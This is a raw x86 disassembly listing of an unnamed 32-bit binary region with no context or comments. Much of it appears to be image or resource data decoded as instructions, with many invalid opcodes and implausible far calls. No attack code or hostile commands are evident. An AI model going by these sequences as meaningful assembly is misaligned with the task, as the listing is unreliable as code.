  40637b:	add    BYTE PTR [ebx+edx*4-0x6b64ff6c],dl
  406382:	xchg   ebp,eax
  406383:	add    BYTE PTR [ecx-0x69ff6a65],dl
  406389:	cdq    
  40638a:	call   0xa700:0x9b9b9c00
  406391:	mov    WORD PTR [esi-0x7b754400],es
  406397:	add    BYTE PTR [ebp-0x4aff726f],ch
  40639d:	xchg   ecx,eax
  40639e:	mov    eax,DWORD PTR [eax]
  4063a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063a1:	popf   
  4063a2:	pushf  
  4063a3:	add    BYTE PTR [edi+ebx*4-0x5c52ff62],bh
  4063aa:	lahf   
  4063ab:	add    BYTE PTR [ebp-0x73ff695f],bh
  4063b1:	pushf  
  4063b2:	mov    ds:0xa19d9500,eax
  4063b7:	add    BYTE PTR [esi+ebx*4-0x4b69ff60],bl
  4063be:	scas   al,BYTE PTR es:[edi]
  4063bf:	add    BYTE PTR [edi-0x5bff4851],dl
  4063c5:	mov    ds:0xa6a800a3,eax
  4063ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063cb:	add    BYTE PTR [eax-0x5bff5359],ch
  4063d1:	stos   BYTE PTR es:[edi],al
  4063d2:	stos   DWORD PTR es:[edi],eax
  4063d3:	add    BYTE PTR [ebp-0x4eff5354],ch
  4063d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063db:	add    BYTE PTR [edx-0x4eff5859],bh
  4063e1:	lods   eax,DWORD PTR ds:[esi]
  4063e2:	lods   al,BYTE PTR ds:[esi]
  4063e3:	add    BYTE PTR [edx-0x51ff5453],bh
  4063e9:	mov    al,0xae
  4063eb:	add    BYTE PTR [ecx-0x4eff5150],bh
  4063f1:	scas   eax,DWORD PTR es:[edi]
  4063f2:	mov    al,0x0
  4063f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063f5:	mov    ch,0xb6
  4063f7:	add    BYTE PTR [edx-0x52ff4b4f],ch
  4063fd:	mov    ebp,0xb3b400be
  406402:	mov    bl,0x0
  406404:	mov    ebx,0xb600b4b7
  406409:	mov    edx,0xb6b000b7
  40640e:	mov    edx,0xb9b5ba00
  406413:	add    BYTE PTR [ecx-0x43ff4346],dh
  406419:	mov    esp,0x89c700bc
  40641e:	add    BYTE PTR [eax],0xc8
  406421:	xchg   esi,eax
  406422:	mov    es,WORD PTR [eax]
  406424:	loop   0x4063b5
  406426:	add    BYTE PTR [eax],0xee
  406429:	cwde   
  40642a:	xchg   DWORD PTR [eax],eax
  40642c:	neg    BYTE PTR [ebx-0x5606ff77]
  406432:	cdq    
  406433:	add    ch,bh
  406435:	mov    ah,0x9c
  406437:	add    ah,al
  406439:	scas   al,BYTE PTR es:[edi]
  40643a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40643b:	add    bh,al
  40643d:	lods   al,BYTE PTR ds:[esi]
  40643e:	stos   BYTE PTR es:[edi],al
  40643f:	add    ch,dl
  406441:	lods   eax,DWORD PTR ds:[esi]
  406442:	mov    ds:0xabb3c400,eax
  406447:	add    ah,dl
  406449:	mov    cl,0xa7
  40644b:	add    al,dl
  40644d:	mov    bl,0xad
  40644f:	add    ch,al
  406451:	mov    bh,0xb5
  406453:	add    bl,cl
  406455:	mov    esp,0xb4cc00b6
  40645a:	mov    esi,0xbbbac000
  40645f:	add    al,cl
  406461:	mov    ebp,0xb7e300bc
  406466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406467:	add    dl,bh
  406469:	mov    eax,0xbfed00a8
  40646e:	mov    bh,0x0
  406470:	test   edx,0xc4e200ac
  406476:	mov    esp,0xb5c7fb00
  40647b:	add    BYTE PTR [esi-0x20ff3b41],dh
  406481:	test   al,0xc4
  406483:	add    BYTE PTR [ebp-0x4eff3237],ch
  406489:	ret    0xc7
  40648c:	mov    esi,0xb700c0c0
  406491:	(bad)  
  406492:	retf   
  406493:	add    BYTE PTR [ebp-0x46ff373a],bh
  406499:	retf   0xcc
  40649c:	mov    dh,0xcc
  40649e:	rol    BYTE PTR [eax],cl
  4064a0:	mov    edx,0xbe00d2ce
  4064a5:	rcl    bl,1
  4064a7:	add    BYTE PTR [edx-0x43ff272f],bh
  4064ad:	loopne 0x406494
  4064af:	add    ah,al
  4064b1:	(bad)  
  4064b2:	les    eax,FWORD PTR [eax]
  4064b4:	retf   0xc5c4
  4064b7:	add    ah,al
  4064b9:	(bad)  
  4064ba:	leave  
  4064bb:	add    ch,al
  4064bd:	retf   
  4064be:	retf   0xcb00
  4064c1:	int3   
  4064c2:	int3   
  4064c3:	add    ch,dl
  4064c5:	mov    bl,0x0
  4064c8:	ror    esp,cl
  4064ca:	int3   
  4064cb:	add    ch,cl
  4064cd:	ror    dh,1
  4064cf:	add    bl,al
  4064d1:	iret   
  4064d2:	rol    BYTE PTR [eax],cl
  4064d4:	fadd   st,st(4)
  4064d6:	rol    BYTE PTR [eax],1
  4064d8:	ret    0xd5d1
  4064db:	add    cl,cl
  4064dd:	rcl    bl,1
  4064df:	add    dl,al
  4064e1:	aam    0xdb
  4064e3:	add    bl,cl
  4064e5:	xlat   BYTE PTR ds:[ebx]
  4064e6:	fild   DWORD PTR [eax]
  4064e8:	ret    
  4064e9:	(bad)  
  4064eb:	add    ch,cl
  4064ed:	(bad)  
  4064ef:	add    bl,dl
  4064f1:	rcl    ebx,cl
  4064f3:	add    dl,bl
  4064f5:	aam    0xd4
  4064f7:	add    dh,bl
  4064f9:	(bad)  
  4064fa:	fadd   DWORD PTR [eax]
  4064fc:	xlat   BYTE PTR ds:[ebx]
  4064fd:	fcmovu st,st(1)
  4064ff:	add    bl,bl
  406501:	(bad)  
  406503:	add    bl,ah
  406505:	int3   
  406506:	les    eax,FWORD PTR [eax]
  406508:	cld    
  406509:	fmul   st,st(1)
  40650b:	add    bh,ah
  40650d:	fstp   st(0)
  40650f:	add    dh,bh
  406511:	fst    st(3)
  406513:	add    dh,ch
  406515:	loop   0x4064f1
  406517:	add    dh,bh
  406519:	jecxz  0x4064f2
  40651b:	add    cl,dl
  40651d:	fsubrp st(1),st
  40651f:	add    bl,al
  406521:	loopne 0x406507
  406523:	add    bl,cl
  406525:	in     al,0xe5
  406527:	add    dh,al
  406529:	out    0xea,al
  40652b:	add    dl,cl
  40652d:	out    0xeb,al
  40652f:	add    dh,al
  406531:	jmp    0xea0f6623
  406536:	in     al,dx
  406537:	add    cl,dl
  406539:	loope  0x40651f
  40653b:	add    dl,bl
  40653d:	in     al,0xe6
  40653f:	add    bl,bl
  406541:	in     eax,0xe8
  406543:	add    ah,bl
  406545:	in     al,dx
  406546:	in     eax,dx
  406547:	add    ah,al
  406549:	jmp    0x40653d
  40654b:	add    ah,dl
  40654d:	out    dx,al
  40654e:	hlt    
  40654f:	add    ah,bl
  406551:	sti    
  406552:	std    
  406553:	add    cl,ah
  406555:	loope  0x406538
  406557:	add    cl,ch
  406559:	in     eax,0xe4
  40655b:	add    al,ah
  40655d:	call   0xec2c664c
  406562:	jmp    0xff00:0xe5e9f900
  406569:	icebp  
  40656a:	in     eax,dx
  40656b:	add    ch,dh
  40656d:	div    ch
  40656f:	add    bh,bh
  406571:	clc    
  406572:	test   BYTE PTR [eax],0xf5
  406575:	idiv   cl
  406577:	add    dh,bh
  406579:	(bad)  
  40657a:	inc    BYTE PTR [eax]
  40657c:	(bad)  
  40657d:	(bad)  
  40657e:	inc    DWORD PTR [eax]
	...
  4065d0:	add    ah,bl
  4065d2:	(bad)  
  4065d4:	iret   
  4065d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  4065ee:	add    bh,cl
  4065f0:	fnstsw ax
  4065f2:	cmc    
  4065f3:	loopne 0x4065d4
  4065f5:	loopne 0x4065c4
  4065f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  40660c:	add    BYTE PTR [edx-0xa1f2120],ah
  406612:	cmc    
  406613:	rcl    ebx,cl
  406615:	clc    
  406616:	iret   
  406617:	rcr    esp,cl
  406619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  40662a:	add    BYTE PTR [eax],al
  40662c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40662d:	fmul   st(5),st
  40662f:	into   
  406630:	fdivr  st(5),st
  406632:	cmc    
  406633:	(bad)  
  406635:	loopne 0x4065ee
  406637:	int    0xa2
  406639:	int    0x9a
	...
  40664b:	add    BYTE PTR [esi-0x2332595e],ah
  406651:	loopne 0x406633
  406653:	ror    ebp,cl
  406655:	iret   
  406656:	int    0xa6
  406658:	cmp    DWORD PTR [eax-0x31],0x0
	...
  40666c:	iret   
  40666d:	rol    ebx,cl
  40666f:	ret    
  406670:	int    0xd3
  406672:	(bad)  
  406674:	int    0xc3
  406676:	xchg   ecx,eax
  406677:	jbe    0x4066ef
  406679:	add    DWORD PTR [ebx+0x0],0x0
  406680:	add    BYTE PTR [eax],al
  406682:	adc    dh,BYTE PTR [edi+0x7f]
	...
  40668d:	mov    ds:0x9ca4cfd3,al
  406692:	cwde   
  406693:	xor    DWORD PTR [esi+0xe],0xb
  406697:	or     eax,0x9c95a27f
  40669c:	int    0x0
  40669e:	add    BYTE PTR [eax],al
  4066a0:	add    BYTE PTR [ebx-0x7c1f5d7d],al
  4066a6:	or     cl,BYTE PTR [esi]
  4066a8:	xchg   ecx,eax
  4066a9:	add    DWORD PTR [eax],0x0
  4066ac:	add    BYTE PTR [eax],al
  4066ae:	add    BYTE PTR [eax+0x10108391],al
  4066b4:	adc    BYTE PTR [esi-0x72],dh
  4066b7:	call   0x95dc:0xefedd8c4
  4066be:	add    BYTE PTR [eax],al
  4066c0:	add    BYTE PTR [edi-0x5c],bh
  4066c3:	js     0x40665a
  4066c5:	fmul   st(5),st
  4066c7:	xor    BYTE PTR [esi+0x7f],0x95
  4066cb:	jg     0x4066cd
  4066cd:	add    BYTE PTR [eax],al
  4066cf:	add    BYTE PTR [ebp-0x6f738186],dl
  4066d5:	fsubr  st,st(0)
  4066d7:	out    dx,al
  4066d8:	fdiv   QWORD PTR [edx-0x3c3a4a95]
  4066de:	add    BYTE PTR [eax],al
  4066e0:	add    BYTE PTR [eax-0x6a6a775a],al
  4066e6:	xchg   ebp,eax
  4066e7:	iret   
  4066e8:	loopne 0x40666d
  4066ea:	or     eax,0xc28d1076
  4066ef:	mov    ecx,0xafb4c5c1
  4066f5:	test   al,0x64
  4066f7:	xor    DWORD PTR [eax],esp
  4066f9:	pop    ds
  4066fa:	pop    ss
  4066fb:	test   eax,ebp
  4066fd:	mov    ds:0x83000000,al
  406702:	int    0x91
  406704:	call   0xc88f:0x727b7f91
  40670b:	repz hlt 
  40670d:	out    dx,al
  40670e:	int    0x89
  406710:	pusha  
  406711:	push   edi
  406712:	cmp    eax,0x1f1f1721
  406717:	and    DWORD PTR [edi],esp
  406719:	xor    BYTE PTR [eax],ch
  40671b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40671c:	jmp    0xd383:0x91
  406723:	mov    bl,BYTE PTR [edx-0x626a806d]
  406729:	into   
  40672a:	xchg   edi,eax
  40672b:	pop    edi
  40672c:	push   esi
  40672d:	aaa    
  40672e:	sbb    al,0x13
  406730:	adc    edx,DWORD PTR [ebx]
  406732:	adc    al,0x17
  406734:	xor    bh,BYTE PTR [ebx]
  406736:	cmp    al,0x3c
  406738:	dec    edx
  406739:	dec    edx
  40673a:	inc    esi
  40673b:	imul   ebp,esp,0x8a
  406741:	mov    ch,bl
  406743:	xchg   ecx,eax
  406744:	call   0x151d:0x4fd68395
  40674b:	add    al,BYTE PTR [ecx]
  40674d:	add    DWORD PTR [edx],eax
  40674f:	adc    al,0x4
  406751:	pop    es
  406752:	sbb    esp,DWORD PTR [esi]
  406754:	dec    esp
  406755:	dec    esp
  406756:	dec    esp
  406757:	dec    ebp
  406758:	dec    ebp
  406759:	popa   
  40675a:	dec    ebx
  40675b:	gs in  al,dx
  40675d:	xchg   ebx,eax
  40675e:	add    BYTE PTR [eax],al
  406760:	add    BYTE PTR [ebx-0x636a6c22],al
  406766:	mov    gs,eax
  406768:	xor    eax,DWORD PTR [edx]
  40676a:	sbb    al,0x19
  40676c:	sbb    DWORD PTR [ecx],ebx
  40676e:	sbb    DWORD PTR ds:0x2c03a296,eax
  406774:	gs gs gs data16 bound sp,DWORD PTR gs:[esi-0x12]
  40677d:	xchg   esp,eax
  40677e:	add    BYTE PTR [eax],al
  406780:	add    BYTE PTR [esi-0x5b637721],cl
  406786:	xchg   ecx,eax
  406787:	aam    0x51
  406789:	sbb    al,0x35
  40678b:	cs sbb al,BYTE PTR cs:[ebx]
  40678f:	mov    ah,0xe0
  406791:	int    0x79
  406793:	das    
  406794:	push   0x6a
  406796:	ins    BYTE PTR es:[edi],dx
  406797:	ins    BYTE PTR es:[edi],dx
  406798:	ins    BYTE PTR es:[edi],dx
  406799:	ins    BYTE PTR es:[edi],dx
  40679a:	addr16 addr16 out 0x9a,eax
  40679e:	add    BYTE PTR [eax],al
  4067a0:	add    BYTE PTR [eax-0x3c65772d],cl
  4067a6:	mov    ds:0x38195bd4,al
  4067ab:	cmp    BYTE PTR ds:0x58fbd208,dh
  4067b1:	xchg   ebp,esi
  4067b3:	push   ecx
  4067b4:	test   eax,0x6f6f6f6f
  4067b9:	jo     0x40682b
  4067bb:	ins    DWORD PTR es:[edi],dx
  4067bc:	fcomp  QWORD PTR [edi-0x7d000000]
  4067c2:	mov    dh,0x79
  4067c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067c5:	iret   
  4067c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067c7:	into   
  4067c8:	sub    BYTE PTR [esi],0x53
  4067cb:	push   ebp
  4067cc:	push   ebx
  4067cd:	sar    ecx,cl
  4067cf:	push   eax
  4067d0:	sub    DWORD PTR [edx],edi
  4067d2:	cmc    
  4067d3:	fstp   QWORD PTR [esi-0x56]
  4067d6:	stos   BYTE PTR es:[edi],al
  4067d7:	stos   BYTE PTR es:[edi],al
  4067d8:	stos   DWORD PTR es:[edi],eax
  4067d9:	lods   al,BYTE PTR ds:[esi]
  4067da:	lods   al,BYTE PTR ds:[esi]
  4067db:	jo     0x40679a
  4067dd:	mov    DWORD PTR [eax],0x967c0000
  4067e3:	jle    0x40679c
  4067e5:	rol    ebx,cl
  4067e7:	into   
  4067e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067e9:	xor    edx,DWORD PTR [ebp+0x57]
  4067ec:	push   ds
  4067ed:	push   esp
  4067ee:	xor    eax,0x5c2a2826
  4067f3:	call   FWORD PTR [ebx-0x52535392]
  4067f9:	lods   eax,DWORD PTR ds:[esi]
  4067fa:	lods   eax,DWORD PTR ds:[esi]
  4067fb:	jo     0x4067b8
  4067fd:	fmul   st,st(5)
  4067ff:	add    BYTE PTR [eax],al
  406801:	jge    0x406877
  406803:	jne    0x4067c5
  406805:	fmul   st(5),st
  406807:	into   
  406808:	lds    esi,FWORD PTR [edi]
  40680a:	pop    esp
  40680b:	push   ebp
  40680c:	push   ss
  40680d:	and    al,0x25
  40680f:	sub    DWORD PTR [edx],ebp
  406811:	inc    esp
  406812:	inc    esi
  406813:	sar    edi,1
  406815:	test   BYTE PTR [edx-0x41454546],bh
  40681b:	lods   eax,DWORD PTR ds:[esi]
  40681c:	mov    ebx,0x95d6
  406821:	jae    0x40682c
  406823:	pmullw mm3,mm7
  406826:	into   
  406827:	ror    eax,cl
  406829:	ss pop ebp
  40682b:	cmp    DWORD PTR [edi],edx
  40682d:	sub    al,BYTE PTR es:[ebp+eax*2+0x43]
  406832:	inc    edi
  406833:	mov    al,0xe0
  406835:	cmc    
  406836:	test   BYTE PTR [esi-0x411d1d1e],bh
  40683c:	mov    esp,0x8ed6
  406841:	jno    0x406849
  406843:	or     al,0xce
  406845:	(bad)  
  406847:	ror    ecx,cl
  406849:	dec    ecx
  40684a:	pop    ecx
  40684b:	sbb    BYTE PTR ds:0x45442a28,ah
  406851:	inc    ecx
  406852:	dec    esi
  406853:	out    0xaf,al
  406855:	loopne 0x4067fd
  406857:	mov    esp,edx
  406859:	loop   0x40683d
  40685b:	loop   0x406819
  40685d:	fild   DWORD PTR [edx+0x10b70000]
  406863:	xchg   ebp,eax
  406864:	std    
  406865:	(bad)  
  406866:	out    dx,eax
  406867:	(bad)  
  406869:	push   edx
  40686a:	das    
  40686b:	pop    ss
  40686c:	sub    BYTE PTR [edx],ch
  40686e:	inc    esp
  40686f:	inc    esp
  406870:	inc    edi
  406871:	inc    edx
  406872:	push   0xdcb1e2fb
  406877:	mov    ch,BYTE PTR [edi-0x411b191c]
  40687d:	loopne 0x40680d
  40687f:	add    BYTE PTR [eax],al
  406881:	add    BYTE PTR [eax],al
  406883:	ret    
  406884:	mov    ds:0xe7ffffdf,al
  406889:	push   edx
  40688a:	adc    al,0x24
  40688c:	sub    BYTE PTR [edx],ch
  40688e:	inc    esp
  40688f:	inc    ebp
  406890:	inc    edi
  406891:	inc    edx
  406892:	lods   eax,DWORD PTR ds:[esi]
  406893:	sti    
  406894:	in     al,0xe3
  406896:	cwde   
  406897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406898:	mov    bh,cl
  40689a:	cli    
  40689b:	cli    
  40689c:	loop   0x406894
  40689e:	xchg   esp,eax
  40689f:	add    BYTE PTR [eax],al
  4068a1:	add    BYTE PTR [eax],al
  4068a3:	add    BYTE PTR [eax],al
  4068a5:	add    BYTE PTR [edx+0x145ad4a2],ah
  4068ab:	and    eax,0x45442a29
  4068b0:	inc    edi
  4068b1:	dec    eax
  4068b2:	in     al,0xff
  4068b4:	cli    
  4068b5:	stc    
  4068b6:	in     eax,0xe5
  4068b8:	jecxz  0x40689e
  4068ba:	out    0xe2,al
  4068bc:	lods   eax,DWORD PTR ds:[esi]
  4068bd:	stc    
  4068be:	lahf   
	...
  4068c7:	add    bh,cl
  4068c9:	mov    BYTE PTR [esi],dl
  4068cb:	and    ah,BYTE PTR [ebx]
  4068cd:	ds aas 
  4068cf:	inc    ecx
  4068d0:	inc    ecx
  4068d1:	dec    eax
  4068d2:	in     al,0xe2
  4068d4:	mov    esi,0xbabcbcbe
  4068d9:	mov    ecx,0xfbe1bdb9
  4068de:	iret   
	...
  4068e7:	add    BYTE PTR [eax],al
  4068e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068ea:	adc    ebx,DWORD PTR [edi]
  4068ec:	and    ebp,DWORD PTR [ebx]
  4068ee:	xor    DWORD PTR [ecx+eiz*2+0x6a],ecx
  4068f2:	mov    al,0xb3
  4068f4:	mov    bl,0xb8
  4068f6:	iret   
  4068f7:	rcl    ebx,cl
  4068f9:	fucomi st,st(6)
  4068fb:	div    ecx
  4068fd:	test   BYTE PTR [eax],0x0
	...
  406908:	add    BYTE PTR [edi-0x596679a6],bh
  40690e:	(bad)  
  40690f:	retf   
  406910:	in     al,dx
  406911:	repnz out dx,al
  406913:	out    dx,eax
  406914:	test   DWORD PTR [eax],0x0
	...
  406926:	add    BYTE PTR [eax],al
  406928:	add    ah,bl
  40692a:	icebp  
  40692b:	icebp  
	...
  406980:	(bad)  
  406981:	(bad)  
  406982:	(bad)  
  406983:	(bad)  
  406984:	(bad)  
  406985:	(bad)  
  406986:	(bad)  
  406987:	(bad)  
  406988:	(bad)  
  406989:	inc    DWORD PTR [ebx+0xfeffff]
  40698f:	(bad)  
  406990:	(bad)  
  406991:	clc    
  406992:	add    BYTE PTR [edi],bh
  406994:	push   eax
  406996:	add    BYTE PTR [edi],bl
  406998:	push   eax
  40699a:	add    BYTE PTR [edi],bl
  40699c:	push   eax
  40699e:	add    BYTE PTR [edi],bl
  4069a0:	xbegin 0x3ec070a6
  4069a6:	add    BYTE PTR [ebx],al
  4069a8:	or     BYTE PTR [edi],0x0
  4069ab:	add    eax,DWORD PTR [eax-0x7ffd0000]
  4069b1:	add    BYTE PTR [eax],al
  4069b3:	add    eax,DWORD PTR [eax-0x7ffd0000]
  4069b9:	add    BYTE PTR [eax],al
  4069bb:	add    eax,DWORD PTR [eax-0x7ffd0000]
  4069c1:	add    BYTE PTR [eax],al
  4069c3:	add    eax,DWORD PTR [eax-0x7ffd0000]
  4069c9:	add    BYTE PTR [eax],al
  4069cb:	add    eax,DWORD PTR [eax-0x7fff0000]
  4069d1:	add    BYTE PTR [eax],al
  4069d3:	add    DWORD PTR [eax-0x7fff0000],eax
  4069d9:	add    BYTE PTR [eax],al
  4069db:	add    DWORD PTR [eax-0x1fff0000],eax
  4069e1:	add    BYTE PTR [eax],al
  4069e3:	add    esp,edi
  4069e5:	add    BYTE PTR [eax],al
  4069e7:	add    edi,edi
  4069e9:	add    BYTE PTR [eax],al
  4069eb:	add    edi,edi
  4069ed:	add    BYTE PTR [eax],0x3
  4069f0:	inc    DWORD PTR [eax-0x700000f9]
  4069f6:	(bad)  
  4069f7:	(bad)  
  4069f8:	(bad)  
  4069f9:	(bad)  
  4069fa:	(bad)  
  4069fb:	(bad)  
  4069fc:	(bad)  
  4069fd:	(bad)  
  4069fe:	(bad)  
  4069ff:	jmp    FWORD PTR [eax]
  406a01:	add    BYTE PTR [eax],al
  406a03:	add    BYTE PTR [eax],dl
  406a05:	add    BYTE PTR [eax],al
  406a07:	add    BYTE PTR [eax],ah
  406a09:	add    BYTE PTR [eax],al
  406a0b:	add    BYTE PTR [ecx],al
  406a0d:	add    BYTE PTR [eax],cl
  406a0f:	add    BYTE PTR [eax],al
  406a11:	add    BYTE PTR [eax],al
  406a13:	add    BYTE PTR [eax],al
  406a15:	add    DWORD PTR [eax],eax
	...
  406a1f:	add    BYTE PTR [eax],al
  406a21:	add    DWORD PTR [eax],eax
  406a23:	add    BYTE PTR [eax],al
  406a25:	add    DWORD PTR [eax],eax
  406a27:	add    BYTE PTR [eax],al
  406a29:	add    BYTE PTR [eax],al
  406a2b:	add    BYTE PTR [eax+0x44],cl
  406a2e:	inc    ebx
  406a2f:	add    BYTE PTR [ebx+0x79],bh
  406a32:	jns    0x406a34
  406a34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a35:	(bad)  
  406a36:	verw   WORD PTR [eax-0x54fff1f2]
  406a3d:	adc    ecx,DWORD PTR ds:0xc1db900
  406a43:	add    BYTE PTR [ecx-0x4dffdfe0],ch
  406a49:	sub    al,0x23
  406a4b:	add    BYTE PTR [edi+ebp*1+0x2fbc0022],dh
  406a52:	and    al,0x0
  406a54:	mov    bl,0x31
  406a56:	and    al,BYTE PTR [eax]
  406a58:	mov    ah,0x3f
  406a5a:	das    
  406a5b:	add    dl,cl
  406a5d:	add    al,0x4
  406a5f:	add    ah,bl
  406a61:	sldt   WORD PTR [eax]
  406a64:	lds    ebx,FWORD PTR [eax]
  406a66:	pop    es
  406a67:	add    ch,al
  406a69:	sbb    al,0x9
  406a6b:	add    ah,dl
  406a6d:	sbb    DWORD PTR [ecx],eax
  406a6f:	add    ah,dl
  406a71:	sbb    eax,0x1ad80001
  406a76:	add    BYTE PTR [eax],al
  406a78:	fstp   DWORD PTR ds:0x12e80000
  406a7e:	add    BYTE PTR [eax],al
  406a80:	out    0x1b,al
  406a82:	add    BYTE PTR [eax],al
  406a84:	in     eax,dx
  406a85:	sbb    al,BYTE PTR [eax]
  406a87:	add    bh,dh
  406a89:	push   ss
  406a8a:	add    BYTE PTR [eax],al
  406a8c:	retf   
  406a8d:	and    eax,0x3bdd0003
  406a92:	adc    BYTE PTR [eax],al
  406a94:	jecxz  0x406abc
  406a96:	add    BYTE PTR [eax],al
  406a98:	mov    ah,0x40
  406a9a:	xor    eax,0x3a43b800
  406a9f:	add    dh,bl
  406aa1:	inc    eax
  406aa2:	and    eax,0x2c47d700
  406aa7:	add    dh,bl
  406aa9:	dec    edi
  406aaa:	sub    eax,0x3441c000
  406aaf:	add    bl,bl
  406ab1:	pop    eax
  406ab2:	cmp    eax,DWORD PTR [eax]
  406ab4:	jecxz  0x406afa
  406ab6:	daa    
  406ab7:	add    bh,bh
  406ab9:	pop    ecx
  406aba:	ss add bh,bh
  406abd:	xor    DWORD PTR gs:[eax],eax
  406ac0:	jmp    FWORD PTR [edx+0x3d]
  406ac3:	add    bh,bh
  406ac5:	jg     0x406b03
  406ac7:	add    ch,bl
  406ac9:	pop    esp
  406aca:	inc    ecx
  406acb:	add    dl,bl
  406acd:	bound  ecx,QWORD PTR [eax+0x0]
  406ad0:	fbstp  TBYTE PTR [ebx+0x43]
  406ad3:	add    dh,dl
  406ad5:	push   0x53
  406ad7:	add    ch,dl
  406ad9:	ins    BYTE PTR es:[edi],dx
  406ada:	pop    ecx
  406adb:	add    bh,bh
  406add:	imul   ecx,DWORD PTR [eax+0x0],0xffffffff
  406ae1:	jo     0x406b2e
  406ae3:	add    ah,cl
  406ae5:	jno    0x406b4a
  406ae7:	add    BYTE PTR [eax],al
  406ae9:	repnz dec eax
  406aeb:	add    dl,bl
  406aed:	adc    DWORD PTR [ecx+0x0],0x5983d7
  406af4:	(bad)  
  406af5:	sbb    BYTE PTR [eax+eax*1-0x2c],0x82
  406afa:	jne    0x406afc
  406afc:	(bad)  
  406afe:	add    BYTE PTR [eax],0x8a
  406b01:	mov    cl,BYTE PTR [edx-0x6f6f6f00]
  406b07:	add    BYTE PTR [esp+edx*4-0x6364ff6c],dl
  406b0e:	pushf  
  406b0f:	add    BYTE PTR [esi-0x4cff6162],bl
  406b15:	lea    eax,[edi-0x5f5f6100]
  406b1b:	add    BYTE PTR [ecx-0x5fff5a41],bl
  406b21:	mov    al,ds:0xa4a400a0
  406b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b27:	add    BYTE PTR [edx-0x54ff5556],ch
  406b2d:	lods   al,BYTE PTR ds:[esi]
  406b2e:	lods   al,BYTE PTR ds:[esi]
  406b2f:	add    BYTE PTR [ebp-0x4fff5253],ch
  406b35:	mov    cl,0xb1
  406b37:	add    BYTE PTR [ebp+esi*4-0x4647ff4b],dh
  406b3e:	mov    ecx,0xbcbcbb00
  406b43:	add    BYTE PTR [esi-0xcff4142],bh
  406b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b4a:	nop
  406b4b:	add    al,al
  406b4d:	mov    edx,0xc0c000b8
  406b52:	rol    BYTE PTR [eax],0xc4
  406b55:	mov    dh,0x0
  406b58:	leave  
  406b59:	(bad)
  406b5c:	(bad)
  406b5f:	add    al,cl
  406b61:	retf   0xca
  406b64:	leave  
  406b65:	retf   
  406b66:	int3   
  406b67:	add    dl,cl
  406b69:	int3   
  406b6a:	int3   
  406b6b:	add    ah,cl
  406b6d:	into   
  406b6e:	into   
  406b6f:	add    ah,bl
  406b71:	retf   0xc9
  406b74:	into   
  406b75:	rcl    al,1
  406b77:	add    al,dl
  406b79:	rcl    edx,1
  406b7b:	add    dh,dl
  406b7d:	(bad)  
  406b7e:	aad    0x0
  406b80:	(bad)  
  406b82:	fld    DWORD PTR [eax]
  406b84:	(bad)  
  406b86:	fild   WORD PTR [eax]
  406b88:	loope  0x406b6b
  406b8a:	loope  0x406b8c
  406b8c:	call   0xee415479
  406b91:	out    dx,al
  406b92:	out    dx,al
  406b93:	add    al,bh
  406b95:	clc    
  406b96:	clc    
	...
  406e23:	add    bh,bh
  406e25:	(bad)  
  406e26:	inc    DWORD PTR [eax]
	...
  406e38:	aaa    
  406e39:	add    dh,BYTE PTR [edi]
  406e3b:	add    BYTE PTR [eax],al
  406e3d:	add    BYTE PTR [esi+0x46],al
  406e40:	inc    esp
  406e41:	cmp    DWORD PTR [ecx],edi
  406e43:	cmp    al,0x3e
  406e45:	add    BYTE PTR [eax],al
  406e47:	add    BYTE PTR [edx+0x37],cl
  406e4a:	inc    esp
  406e4b:	add    BYTE PTR [eax],al
  406e4d:	add    BYTE PTR [ecx+0x4e],bl
  406e50:	dec    edx
  406e51:	inc    esi
  406e52:	inc    eax
  406e53:	add    BYTE PTR ds:[eax],al
  406e56:	add    BYTE PTR [eax],al
  406e58:	inc    eax
  406e59:	dec    edx
  406e5a:	add    BYTE PTR ds:[eax],al
  406e5d:	add    BYTE PTR [eax],al
  406e5f:	add    BYTE PTR [esi+0x36],al
  406e62:	cmp    DWORD PTR [eax],eax
  406e64:	add    BYTE PTR [eax],al
  406e66:	add    BYTE PTR [eax],al
  406e68:	inc    esp
  406e69:	push   esp
  406e6a:	inc    eax
  406e6b:	pop    eax
  406e6c:	dec    edx
  406e6d:	inc    esi
  406e6e:	inc    esi
  406e6f:	inc    esi
  406e70:	inc    esp
  406e71:	inc    eax
  406e72:	inc    eax
  406e73:	ds ds ds ds dec esi
  406e78:	inc    eax
  406e79:	push   esp
  406e7a:	inc    eax
  406e7b:	push   ebx
  406e7c:	push   ebx
  406e7d:	push   ebx
  406e7e:	dec    esi
  406e7f:	dec    esi
  406e80:	dec    esi
  406e81:	dec    esi
  406e82:	dec    esi
  406e83:	dec    esi
  406e84:	dec    esi
  406e85:	dec    esi
  406e86:	dec    esi
  406e87:	cmp    DWORD PTR [esp+edx*2+0x40],eax
  406e8b:	push   ebx
  406e8c:	inc    eax
  406e8d:	add    eax,DWORD PTR [ebx]
  406e8f:	add    eax,DWORD PTR [edi]
  406e91:	or     al,0x12
  406e93:	adc    dl,BYTE PTR [ecx+ebx*1]
  406e96:	dec    edx
  406e97:	ds inc ebx
  406e99:	push   esp
  406e9a:	inc    eax
  406e9b:	push   esp
  406e9c:	inc    eax
  406e9d:	or     DWORD PTR [ecx],ecx
  406e9f:	push   es
  406ea0:	dec    esp
  406ea1:	das    
  406ea2:	pop    ds
